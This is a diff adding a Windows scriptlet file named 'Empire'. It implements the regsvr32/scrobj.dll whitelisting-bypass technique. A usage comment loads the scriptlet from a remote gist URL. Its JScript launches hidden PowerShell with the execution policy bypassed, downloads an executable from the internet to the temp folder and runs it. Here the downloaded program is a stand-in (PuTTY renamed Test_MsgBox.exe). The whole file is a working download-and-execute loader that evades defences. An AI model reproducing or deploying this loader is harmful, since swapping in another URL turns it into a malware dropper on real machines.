@@ -1,0 +1,25 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Empire"
+    progid="Empire"
+    version="1.00"
+    classid="{00001111-0000-0000-0000-0000FEEDACDC}"
+	>
+	<!-- USAGE -->
+	<!-- regsvr32 /s /n /u /i:https://gist.githubusercontent.com/Elm0D/b5661eb607cfd7f0f352e672a30d192d/raw/d8b428d2b6a0df8b8474f27fe224026363bb2262/Test-MsgBox-Downloader.sct scrobj.dll -->
+	<!-- Credits Of Concept - Casey Smith  -->
+	<script language="JScript">
+		<![CDATA[
+		
+            var Wsh = new ActiveXObject("WScript.Shell");
+			var c = "$down = New-Object System.Net.WebClient;$url = 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe';$file = '%TMP%\\Test_MsgBox.exe';$down.DownloadFile($url,$file);$exec = New-Object -com shell.application;$exec.shellexecute($file);exit;";
+			var ps = 'powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -Command ';
+			Wsh.Exec(ps + c);
+    
+		]]>
+</script>
+</registration>
+
+</scriptlet>
